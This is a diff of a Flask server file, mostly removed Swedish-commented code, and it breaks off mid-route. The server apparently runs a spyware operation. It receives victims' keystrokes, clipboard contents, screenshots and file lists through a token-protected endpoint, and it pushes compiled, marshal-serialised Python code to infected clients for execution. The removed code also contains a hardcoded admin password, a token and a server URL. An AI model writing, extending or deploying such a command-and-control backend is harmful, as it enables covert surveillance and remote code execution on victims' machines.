@@ -1,963 +1,74 @@
 
-#!/usr/bin/python3.13
-from flask import Flask, request, jsonify, session, redirect, url_for, render_template, make_response, send_file, send_from_directory
-import json
+#!/usr/bin/python
 import os
+import sys
+import json
+import logging
+import threading
+import time
+import shutil
 import traceback
 from datetime import datetime, timedelta
-import re
-import urllib.parse
-import logging
-import marshal
-import shutil
-import io
+from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
+from flask_cors import CORS
 import zipfile
-import time
-import subprocess
-import base64
-import secrets
-import threading
+from io import BytesIO
 
-# Importera instruktioner från en separat fil
+# Import instructions for clients
 from instructions import INSTRUCTIONS
 
-# Initialisera Flask med rätt mapp för mallar och statiska filer
-app = Flask(__name__, template_folder="templates", static_folder="static")
-app.secret_key = "jonnybravobaby!!!"
-app.config['SESSION_TYPE'] = 'filesystem'
-app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
-
-# Konfiguration av kataloger och filer
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # Hämta katalogen där server.py ligger
-LOG_DIRECTORY = os.path.join(BASE_DIR, "logs")
+# Base directory setup
+BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+LOG_DIRECTORY = os.path.join(BASE_DIR, "data", "logs")
 CLIENT_LOGS_DIRECTORY = os.path.join(LOG_DIRECTORY, "clients")
-INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
-ADMIN_CREDENTIALS_FILE = os.path.join(LOG_DIRECTORY, "admin_credentials.json")
-PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
-SCREENSHOTS_FILE = os.path.join(LOG_DIRECTORY, "screenshots.json")
 STATIC_DIRECTORY = os.path.join(BASE_DIR, "static")
+TEMPLATES_DIRECTORY = os.path.join(BASE_DIR, "templates")
+CONFIG_DIRECTORY = os.path.join(BASE_DIR, "config")
+INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
+PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
+ADMIN_CREDENTIALS_FILE = os.path.join(CONFIG_DIRECTORY, "admin_credentials.json")
 
-# Skapa kataloger om de inte finns
-os.makedirs(LOG_DIRECTORY, exist_ok=True)
-os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
-os.makedirs(STATIC_DIRECTORY, exist_ok=True)
+# Constants
+ONLINE_THRESHOLD_MINUTES = 5
+AUTO_PING_INTERVAL = 60  # seconds
 
-# Konfigurera loggning med detaljerad utdata
+# Initialize the Flask application
+app = Flask(__name__, 
+            static_url_path='/static', 
+            static_folder=STATIC_DIRECTORY,
+            template_folder=TEMPLATES_DIRECTORY)
+CORS(app)
+
+# Session key for Flask
+app.secret_key = os.urandom(24)
+
+# Setup logging
 logging.basicConfig(
     level=logging.DEBUG,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s [%(levelname)s] %(message)s',
     handlers=[
-        logging.FileHandler(os.path.join(LOG_DIRECTORY, "neea_server.log")),
-        logging.StreamHandler()
+        logging.FileHandler(os.path.join(LOG_DIRECTORY, "server.log")),
+        logging.StreamHandler(sys.stdout)
     ]
 )
 
-# Lägg till en handler för debug.log
-debug_log_path = os.path.join(LOG_DIRECTORY, "debug.log")
-debug_handler = logging.FileHandler(debug_log_path)
-debug_handler.setLevel(logging.DEBUG)
-debug_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-logging.getLogger().addHandler(debug_handler)
-logging.info(f"Debugloggning aktiverad till {debug_log_path}")
-logging.debug(f"Loggning initialiserad med handlers: neea_server.log, konsol och debug.log")
-
-# Standardadminuppgifter
-DEFAULT_ADMIN_USERNAME = "wickey"
-DEFAULT_ADMIN_PASSWORD = "lolpol771020!!!"
-
-# Kontrollera att loggkatalogerna är skrivbara
-try:
-    test_file_path = os.path.join(CLIENT_LOGS_DIRECTORY, "test_write.tmp")
-    logging.debug(f"Testar skrivrättigheter för {test_file_path}")
-    with open(test_file_path, 'w') as f:
-        f.write("Testar skrivrättigheter")
-    os.remove(test_file_path)
-    logging.info("Loggkatalogerna är skrivbara")
-    logging.debug(f"Testet lyckades och {test_file_path} togs bort")
-except Exception as e:
-    logging.error(f"Fel: Loggkatalogerna är inte skrivbara: {e}")
-    logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-
-# Serverkonfiguration
-SERVER_CONFIG = {
-    "server_url": "https://neea.fun/listener/log_receiver",
-    "secret_token": "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==",
-    "send_interval": 3600,
-    "size_limit": 1048576
-}
-
-# Statusperioder i minuter
-ACTIVE_STATUS_MINUTES = 10
-ONLINE_THRESHOLD_MINUTES = 15
-AUTO_PING_INTERVAL = 3600  # Automatiskt pingintervall i sekunder (1 timme)
-
-# Globala variabler för bakgrundsprocesser
+# Global variables for auto-ping thread
 auto_ping_thread = None
 auto_ping_running = False
 
-def sanitize_filename(filename):
-    """Rensar filnamn genom att ta bort ogiltiga tecken."""
-    logging.debug(f"Rensar filnamn: {filename}")
-    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '_', str(filename).lower())
-    result = sanitized if sanitized else "unknown"
-    logging.debug(f"Rensat resultat: {result}")
-    return result
-
-def get_client_ip(request):
-    """Hämtar både privat och offentlig IP-adress från en förfrågan."""
-    logging.debug(f"Hämtar klient-IP från förfråganshuvuden: {dict(request.headers)}")
-    private_ip = request.remote_addr or "unknown"
-    public_ip = request.headers.get('X-Forwarded-For', request.headers.get('X-Real-IP', private_ip))
-    logging.debug(f"Klient-IP: privat: {private_ip}, offentlig: {public_ip}")
-    return private_ip, public_ip
-
-def is_client_active(last_activity_str):
-    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
-    logging.debug(f"Kontrollerar om klienten är aktiv med senaste aktivitet: {last_activity_str}")
-    if not last_activity_str:
-        logging.debug("Ingen senaste aktivitet angiven, klienten anses inaktiv")
-        return False
-    try:
-        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
-        now = datetime.now()
-        is_active = (now - last_activity) < timedelta(minutes=ACTIVE_STATUS_MINUTES)
-        logging.debug(f"Klientens aktivstatus: {is_active}, tidsdifferens: {now - last_activity}")
-        return is_active
-    except Exception as e:
-        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-
-def update_ping_status(client_id, status):
-    """Uppdaterar pingstatus för en klient."""
-    logging.debug(f"Uppdaterar pingstatus för klient {client_id} till {status}")
-    if not client_id:
-        logging.error("Kan inte uppdatera pingstatus: client_id är tomt")
-        return False
-        
-    client_index = {}
-    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
-        try:
-            logging.debug(f"Laddar client_index från {INDEX_FILE}")
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f) or {}
-            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-        except Exception as e:
-            logging.error(f"Fel vid läsning av client_index.json för pinguppdatering: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return False
-            
-    if client_id in client_index:
-        client_index[client_id]["ping_status"] = status
-        client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        logging.debug(f"Uppdaterade klient {client_id} ping_status: {status}, last_ping: {client_index[client_id]['last_ping']}")
-        
-        try:
-            with open(INDEX_FILE, "w", encoding="utf-8") as f:
-                json.dump(client_index, f, indent=4)
-            logging.info(f"Pingstatus uppdaterad för klient {client_id}: {status}")
-            return True
-        except Exception as e:
-            logging.error(f"Fel vid skrivning till client_index.json för pinguppdatering: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return False
-    else:
-        logging.warning(f"Kan inte uppdatera pingstatus: klient {client_id} hittades inte i index")
-        return False
-
-def update_client_index(client_id, original_user, system, private_ip, public_ip, system_info=None):
-    """Uppdaterar klientindex med användar-/systeminformation och tider, samt eventuellt system_info."""
-    logging.debug(f"Går in i update_client_index med client_id={client_id}, original_user={original_user}, system={system}, private_ip={private_ip}, public_ip={public_ip}, system_info={system_info}")
-    if not client_id:
-        logging.error("Kan inte uppdatera klientindex: client_id är tomt")
-        return False
-        
-    client_id = sanitize_filename(client_id)
-    client_index = {}
-    
-    # Ladda befintligt klientindex om det finns
-    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
-        try:
-            logging.debug(f"Laddar befintligt client_index från {INDEX_FILE}")
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f) or {}
-            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-        except json.JSONDecodeError:
-            logging.error("Klientindexfilen innehåller ogiltig JSON. Skapar nytt index.")
-            client_index = {}
-        except Exception as e:
-            logging.error(f"Fel vid läsning av client_index.json: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            client_index = {}
-    else:
-        logging.debug(f"Klientindexfilen hittades inte på {INDEX_FILE}, initialiserar nytt index")
-        if os.path.exists(INDEX_FILE) and os.path.isdir(INDEX_FILE):
-            logging.warning("Klientindexvägen är en katalog. Tar bort och skapar ny fil.")
-            shutil.rmtree(INDEX_FILE)
-        client_index = {}
-
-    last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    logging.debug(f"Sätter last_seen-tidsstämpel: {last_seen}")
-
-    # Om klienten inte finns, initialisera den med grundläggande fält
-    if client_id not in client_index:
-        client_index[client_id] = {
-            "username": original_user[:50] if original_user else "unknown",
-            "system": system[:50] if system else "unknown",
-            "first_seen": last_seen,
-            "last_activity": last_seen,
-            "private_ip": private_ip[:40] if private_ip else "unknown",
-            "public_ip": public_ip[:40] if public_ip else "unknown",
-            "ping_status": "unknown",
-            "last_ping": "",
-            "instruction": "standard"
-        }
-        logging.debug(f"Initialiserade ny klientpost för {client_id}")
-    else:
-        # Uppdatera endast specifika fält och bevara andra
-        client_index[client_id]["last_activity"] = last_seen
-        client_index[client_id]["private_ip"] = private_ip[:40] if private_ip else "unknown"
-        client_index[client_id]["public_ip"] = public_ip[:40] if public_ip else "unknown"
-        logging.debug(f"Uppdaterade last_activity, private_ip och public_ip för {client_id}")
-
-    # Lägg till eller uppdatera system_info om det anges
-    if system_info:
-        logging.debug(f"Uppdaterar klient {client_id} med system_info: {system_info}")
-        client_index[client_id].update(system_info)
-
-    # Spara uppdaterat index
-    try:
-        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
-        logging.debug(f"Sparar uppdaterat client_index till {INDEX_FILE}")
-        with open(INDEX_FILE, "w", encoding="utf-8") as f:
-            json.dump(client_index, f, indent=4)
-        logging.info(f"Klientindex uppdaterat för klient: {client_id}")
-        logging.debug(f"Sparade client_index.json med {len(client_index)} klienter")
-        return True
-    except Exception as e:
-        logging.error(f"Fel vid skrivning till client_index.json: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-
-def update_client_instruction(client_id, instruction):
-    """Uppdaterar den valda instruktionen för en klient."""
-    logging.debug(f"Uppdaterar instruktion för klient {client_id} till {instruction}")
-    if not client_id or not instruction:
-        logging.error(f"Kan inte uppdatera instruktion: client_id eller instruktion är tomt ({client_id}, {instruction})")
-        return False
-        
-    if instruction not in INSTRUCTIONS:
-        logging.error(f"Ogiltig instruktionstyp: {instruction}")
-        return False
-        
-    client_index = {}
-    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
-        try:
-            logging.debug(f"Laddar client_index för instruktionsuppdatering från {INDEX_FILE}")
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f) or {}
-            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-        except Exception as e:
-            logging.error(f"Fel vid läsning av client_index.json för instruktionsuppdatering: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return False
-            
-    if client_id in client_index:
-        client_index[client_id]["instruction"] = instruction
-        logging.debug(f"Satte instruktion för {client_id} till {instruction}")
-        
-        try:
-            with open(INDEX_FILE, "w", encoding="utf-8") as f:
-                json.dump(client_index, f, indent=4)
-            logging.info(f"Instruktion uppdaterad för klient {client_id}: {instruction}")
-            return True
-        except Exception as e:
-            logging.error(f"Fel vid skrivning till client_index.json för instruktionsuppdatering: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return False
-    else:
-        logging.warning(f"Kan inte uppdatera instruktion: klient {client_id} hittades inte i index")
-        return False
-
-def clear_client_logs(client_id):
-    """Rensar loggar för en specifik klient."""
-    logging.debug(f"Rensar loggar för klient {client_id}")
-    if not client_id:
-        logging.error("Kan inte rensa loggar: client_id är tomt")
-        return False
-        
-    log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
-    try:
-        os.makedirs(os.path.dirname(log_file), exist_ok=True)
-        logging.debug(f"Skriver rensad loggpost till {log_file}")
-        with open(log_file, 'w', encoding='utf-8') as f:
-            f.write(f"Loggar rensade: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("-" * 50 + "\n\n")
-        logging.info(f"Loggfil rensad för klient {client_id}")
-        return True
-    except PermissionError:
-        logging.error(f"Tillstånd nekades vid rensning av loggfil för {client_id}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-    except Exception as e:
-        logging.error(f"Fel vid rensning av loggfil {log_file}: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-
-def ping_client(client_id):
-    """Pingar en klient för att kontrollera om den är online."""
-    logging.debug(f"Manuell pingförfrågan för klient: {client_id}")
-    if not client_id:
-        logging.error("Kan inte pinga klient: client_id är tomt")
-        return "unknown"
-        
-    client_index = {}
-    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
-        try:
-            logging.debug(f"Laddar client_index för ping från {INDEX_FILE}")
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f) or {}
-            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-        except Exception as e:
-            logging.error(f"Fel vid läsning av client_index.json för klientping: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return "unknown"
-            
-    if client_id in client_index:
-        try:
-            last_activity_str = client_index[client_id].get("last_activity", "1970-01-01 00:00:00")
-            last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
-            now = datetime.now()
-            status = "online" if (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES) else "offline"
-            logging.debug(f"Pingresultat för {client_id}: {status}, senaste aktivitet: {last_activity_str}")
-            update_ping_status(client_id, status)
-            logging.info(f"Klient {client_id} pingad: {status}")
-            return status
-        except Exception as e:
-            logging.error(f"Fel vid ping av klient {client_id}: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return "unknown"
-    else:
-        logging.warning(f"Klient {client_id} hittades inte i klientlistan för ping")
-        return "unknown"
-
-def sort_log_entries(log_content, sort_order="newest"):
-    """Sorterar loggposter efter datum, om möjligt."""
-    logging.debug(f"Sorterar loggposter med sorteringsordning: {sort_order}")
-    if not log_content:
-        logging.debug("Inget logginnehåll att sortera")
-        return ""
-    try:
-        separator = "-"*50 + "\n\n"
-        if separator not in log_content:
-            logging.warning("Loggseparator hittades inte vid sortering av loggar.")
-            return log_content
-        
-        log_entries = log_content.split(separator)
-        if log_entries and not log_entries[-1].strip():
-            log_entries.pop()
-        if not log_entries:
-            logging.debug("Inga giltiga loggposter att sortera")
-            return log_content
-        
-        dated_entries = []
-        for entry in log_entries:
-            try:
-                date_match = re.search(r'(\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})', entry)
-                if date_match:
-                    entry_date = datetime.strptime(date_match.group(1), "%Y-%m-%d %H:%M:%S")
-                    dated_entries.append((entry_date, entry))
-                else:
-                    if sort_order == "newest":
-                        dated_entries.append((datetime.min, entry))
-                    else:
-                        dated_entries.append((datetime.max, entry))
-            except Exception as e:
-                logging.error(f"Fel vid extrahering av datum från loggpost: {e}")
-                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-                dated_entries.append((datetime.min, entry))
-        
-        if sort_order == "newest":
-            dated_entries.sort(key=lambda x: x[0], reverse=True)
-        else:
-            dated_entries.sort(key=lambda x: x[0])
-        
-        sorted_content = separator.join([e for _, e in dated_entries])
-        if not sorted_content.endswith("\n\n"):
-            sorted_content += "\n\n"
-        logging.debug(f"Loggposter sorterade framgångsrikt, längd: {len(sorted_content)}")
-        return sorted_content
-    except Exception as e:
-        logging.error(f"Fel vid sortering av loggar: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return log_content
-
-def install_static_files():
-    """Installerar HTML-, CSS- och JS-filer i den statiska katalogen."""
-    logging.debug("Startar installation av statiska filer")
-    try:
-        if not os.path.exists(STATIC_DIRECTORY):
-            os.makedirs(STATIC_DIRECTORY, exist_ok=True)
-            logging.debug(f"Skapade statisk katalog: {STATIC_DIRECTORY}")
-            
-        templates_dir = os.path.join(BASE_DIR, "templates")
-        os.makedirs(templates_dir, exist_ok=True)
-        logging.debug(f"Säkerställde att mallkatalogen finns: {templates_dir}")
-        
-        html_file = os.path.join(BASE_DIR, "index.html")
-        css_file = os.path.join(BASE_DIR, "styles.css")
-        js_file = os.path.join(BASE_DIR, "script.js")
-        
-        if os.path.exists(html_file):
-            with open(html_file, 'r', encoding='utf-8') as f:
-                html_content = f.read()
-            viewer_html = os.path.join(templates_dir, "viewer.html")
-            with open(viewer_html, 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            logging.info(f"HTML-fil installerad till {viewer_html}")
-            
-        if os.path.exists(css_file):
-            with open(css_file, 'r', encoding='utf-8') as f:
-                css_content = f.read()
-            static_css = os.path.join(STATIC_DIRECTORY, "styles.css")
-            with open(static_css, 'w', encoding='utf-8') as f:
-                f.write(css_content)
-            logging.info(f"CSS-fil installerad till {static_css}")
-            
-        if os.path.exists(js_file):
-            with open(js_file, 'r', encoding='utf-8') as f:
-                js_content = f.read()
-            static_js = os.path.join(STATIC_DIRECTORY, "script.js")
-            with open(static_js, 'w', encoding='utf-8') as f:
-                f.write(js_content)
-            logging.info(f"JS-fil installerad till {static_js}")
-            
-        logging.debug("Installation av statiska filer slutförd framgångsrikt")
-        return True
-    except Exception as e:
-        logging.error(f"Fel vid installation av statiska filer: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-
-@app.route("/styles.css")
-def serve_css():
-    logging.debug("Serverar styles.css")
-    return send_from_directory(STATIC_DIRECTORY, "styles.css", mimetype="text/css")
-
-@app.route("/script.js")
-def serve_js():
-    logging.debug("Serverar script.js")
-    return send_from_directory(STATIC_DIRECTORY, "script.js", mimetype="application/javascript")
-
-@app.route("/config/get_config", methods=["GET"])
-def get_config():
-    """Returnerar serverkonfiguration till klienten."""
-    client_ip = request.remote_addr
-    logging.debug(f"Konfiguration begärd från IP: {client_ip}")
-    logging.info(f"Konfiguration begärd från IP: {client_ip}")
-    return jsonify(SERVER_CONFIG)
-
-@app.route("/listener/log_receiver", methods=["POST"])
-def log_receiver():
-    """Tar emot och loggar data från klienten, lagrar system_info i client_index.json."""
-    private_ip, public_ip = get_client_ip(request)
-    logging.debug(f"Mottog förfrågan från {private_ip}, metod={request.method}")
-    logging.debug(f"Förfråganshuvuden: {dict(request.headers)}")
-    logging.debug(f"Rå förfråganstext: {request.get_data(as_text=True)}")
-    logging.info(f"Mottog klientdata från {private_ip}")
-
-    if request.method != "POST":
-        logging.warning(f"Ogiltig metod från {private_ip}: {request.method}")
-        return "Metoden är inte tillåten", 405
-
-    # Validera token
-    auth_header = request.headers.get("Authorization", "")
-    logging.debug(f"Auktoriseringshuvud: {auth_header}")
-    if not auth_header or not re.match(r"Bearer\s+(\S+)", auth_header):
-        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Saknar/ogiltigt auktoriseringshuvud")
-        return "Oauktoriserad: Saknar eller ogiltigt auktoriseringshuvud", 401
-
-    token_match = re.match(r"Bearer\s+(\S+)", auth_header)
-    if not token_match:
-        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Kunde inte extrahera token")
-        return "Oauktoriserad: Saknar eller ogiltigt auktoriseringshuvud", 401
-        
-    token = token_match.group(1)
-    logging.debug(f"Extraherad token: {token}")
-    if token != SERVER_CONFIG["secret_token"]:
-        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Ogiltig token")
-        return "Oauktoriserad: Ogiltig token", 401
-    logging.info(f"Token validerad framgångsrikt för {private_ip}")
-
-    # Parsa JSON
-    try:
-        data = request.get_json()
-        logging.debug(f"Parsad JSON-data: {data}")
-        if not data:
-            logging.error(f"Dålig förfrågan från {private_ip}: Ogiltig JSON")
-            return "Dålig förfrågan: Ogiltig JSON", 400
-    except Exception as e:
-        logging.error(f"Dålig förfrågan från {private_ip}: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return "Dålig förfrågan: Ogiltig JSON", 400
-
-    data_type = data.get("type", "")
-    user = data.get("user", "").strip() or "unknown"
-    system = data.get("system", "").strip() or "unknown"
-    log_data = data.get("data", "")
-    logging.debug(f"Extraherade fält - typ: {data_type}, användare: {user}, system: {system}, loggdata: {log_data}")
-
-    if not user:
-        user = system if system else "unknown"
-    sanitized_user = sanitize_filename(user)
-    decoded_data = urllib.parse.unquote(log_data)
-    logging.debug(f"Rensad användare: {sanitized_user}, Avkodad data: {decoded_data}")
-
-    if data_type == "system_info":
-        try:
-            system_info = json.loads(decoded_data)
-            logging.debug(f"Parsad system_info: {system_info}")
-            update_client_index(sanitized_user, user, system, private_ip, public_ip, system_info)
-            logging.info(f"Bearbetade system_info för {sanitized_user}")
-        except json.JSONDecodeError as e:
-            logging.error(f"Fel vid parsning av system_info JSON: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-    else:
-        # Bygg loggpost
-        log_entry = (
-            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | IP (privat): {private_ip} | "
-            f"IP (offentlig): {public_ip} | Användare: {user} | System: {system}\n"
-        )
-        logging.debug(f"Bygger loggpost: {log_entry}")
-
-        if data_type == "clipboard":
-            log_entry += f"Urklipp:\n{decoded_data}\n"
-            logging.debug(f"Urklippsdata: {decoded_data}")
-        elif data_type == "keystrokes":
-            if decoded_data.strip() == "New client connected":
-                log_entry += "[NY KLIENT ANSLUTEN]\n"
-                logging.debug("Meddelande om ny klientanslutning upptäckt")
-            else:
-                log_entry += f"Tangenttryckningar:\n{decoded_data}\n"
-                logging.debug(f"Tangenttrycksdata: {decoded_data}")
-        elif data_type == "screenshot":
-            log_entry += f"Skärmdump tagen (Base64-data, längd: {len(decoded_data)})\n"
-            logging.debug(f"Skärmdumpdatalängd: {len(decoded_data)}")
-            try:
-                if os.path.exists(SCREENSHOTS_FILE):
-                    with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
-                        screenshots_data = json.load(sf)
-                    logging.debug(f"Laddade befintlig skärmdumpdata med {len(screenshots_data)} poster")
-                else:
-                    screenshots_data = []
-                    logging.debug(f"Ingen skärmdumpfil hittades, initialiserar tom lista")
-            except Exception as e:
-                logging.error(f"Fel vid läsning av skärmdumpfil: {e}")
-                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-                screenshots_data = []
-            
-            screenshot_entry = {
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "user": user,
-                "system": system,
-                "private_ip": private_ip,
-                "public_ip": public_ip,
-                "data": decoded_data
-            }
-            screenshots_data.append(screenshot_entry)
-            logging.debug(f"Lade till skärmdumppost: {screenshot_entry}")
-            
-            try:
-                with open(SCREENSHOTS_FILE, "w", encoding="utf-8") as sf:
-                    json.dump(screenshots_data, sf, indent=4)
-                logging.debug(f"Sparade skärmdumpdata till {SCREENSHOTS_FILE}")
-            except Exception as e:
-                logging.error(f"Fel vid skrivning av skärmdumpfil: {e}")
-                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        elif data_type == "file_list":
-            log_entry += f"Fillista:\n{decoded_data}\n"
-            logging.debug(f"Fillistdata: {decoded_data}")
-        elif data_type == "file_content":
-            log_entry += "Filinnehåll mottaget\n"
-            logging.debug("Filinnehåll mottaget")
-        else:
-            log_entry += f"Okänd datatyp: {data_type}\n{decoded_data}\n"
-            logging.warning(f"Okänd datatyp mottagen: {data_type}")
-
-        log_entry += "-"*50 + "\n\n"
-        logging.debug(f"Slutförd loggpost: {log_entry}")
-
-        # Skriv till klientlogg
-        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{sanitized_user}.log")
-        logging.debug(f"Förbereder att skriva till klientloggfil: {client_log_file}")
-        try:
-            os.makedirs(os.path.dirname(client_log_file), exist_ok=True)
-            logging.debug(f"Säkerställde att katalogen finns för {client_log_file}")
-            with open(client_log_file, "a", encoding="utf-8", errors="replace") as f:
-                f.write(log_entry)
-            logging.info(f"Skrev loggpost till {client_log_file}")
-        except Exception as e:
-            logging.error(f"Fel vid skrivning till loggfil {client_log_file}: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return "Internt serverfel: Kunde inte skriva logg", 500
-
-    # Uppdatera index för alla datatyper
-    update_client_index(sanitized_user, user, system, private_ip, public_ip)
-    logging.info(f"Data bearbetades framgångsrikt för användare: {sanitized_user}")
-    return "Data mottagna", 200
-
-@app.route("/get_instructions", methods=["GET"])
-def get_instructions():
-    """Skickar kompilerade och serialiserade instruktioner till klienten."""
-    logging.debug(f"Instruktionsförfrågan mottagen med huvuden: {dict(request.headers)}")
-    auth_header = request.headers.get("Authorization", "")
-    if not auth_header or not re.match(r"Bearer\s+(\S+)", auth_header):
-        logging.warning("Oauktoriserad instruktionsförfrågan: Saknar eller ogiltigt auktoriseringshuvud")
-        return "Oauktoriserad", 401
-        
-    token_match = re.match(r"Bearer\s+(\S+)", auth_header)
-    if not token_match:
-        logging.warning("Oauktoriserad instruktionsförfrågan: Kunde inte extrahera token")
-        return "Oauktoriserad", 401
-        
-    token = token_match.group(1)
-    logging.debug(f"Extraherad token: {token}")
-    if token != SERVER_CONFIG["secret_token"]:
-        logging.warning("Oauktoriserad instruktionsförfrågan: Ogiltig token")
-        return "Oauktoriserad", 401
-
-    client_id = request.args.get("client_id", "")
-    instruction_type = "standard"
-    logging.debug(f"Klient-ID från förfrågan: {client_id}")
-
-    if client_id:
-        client_index = {}
-        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
-            try:
-                logging.debug(f"Laddar client_index för instruktioner från {INDEX_FILE}")
-                with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                    client_index = json.load(f) or {}
-                logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-            except Exception as e:
-                logging.error(f"Fel vid läsning av client_index.json för instruktioner: {e}")
-                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        if client_id in client_index:
-            instruction_type = client_index[client_id].get("instruction", "standard")
-            logging.info(f"Serverar instruktionstyp '{instruction_type}' till klient {client_id}")
-        else:
-            logging.info(f"Klient {client_id} hittades inte i index, serverar standardinstruktion")
-
-    instruction_code = INSTRUCTIONS.get(instruction_type, INSTRUCTIONS["standard"])
-    logging.debug(f"Vald instruktionskodlängd: {len(instruction_code)}")
-
-    try:
-        code_object = compile(instruction_code, '<string>', 'exec')
-        serialized_code = marshal.dumps(code_object)
-        logging.debug(f"Instruktionskod kompilerad och serialiserad, storlek: {len(serialized_code)} byte")
-        response = make_response(serialized_code)
-        response.headers['Content-Type'] = 'application/octet-stream'
-        return response
-    except SyntaxError as e:
-        logging.error(f"Syntaxfel i instruktionskod '{instruction_type}': {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return "Internt serverfel: Ogiltig instruktionssyntax", 500
-    except Exception as e:
-        logging.error(f"Fel vid kompilering/serialisering av instruktionskod '{instruction_type}': {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return "Internt serverfel: Misslyckades med att bearbeta instruktioner", 500
-
-@app.route("/api/ping_client", methods=["POST"])
-def api_ping_client():
-    """API-endpunkt för att pinga en klient."""
-    logging.debug(f"Pingklientförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
-    logging.info(f"Pingklientförfrågan från {request.remote_addr}")
-    try:
-        if request.is_json:
-            data = request.get_json()
-        else:
-            data = {key: request.form[key] for key in request.form}
-        logging.debug(f"Parsad förfrågansdata: {data}")
-            
-        if not data:
-            logging.error("Ogiltig data i pingförfrågan")
-            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
-            
-        client_id = data.get("client_id")
-        if not client_id:
-            logging.warning("Ogiltig pingförfrågan: Saknar client_id")
-            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
-    except Exception as e:
-        logging.error(f"Fel vid parsning av pingförfrågan: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
-    
-    try:
-        status = ping_client(client_id)
-        logging.info(f"Ping lyckades för klient {client_id}: {status}")
-        return jsonify({"status": "success", "ping_status": status})
-    except Exception as e:
-        logging.error(f"Fel vid ping av klient {client_id}: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid ping av klient: {str(e)}"}), 500
-
-@app.route("/api/update_instruction", methods=["POST"])
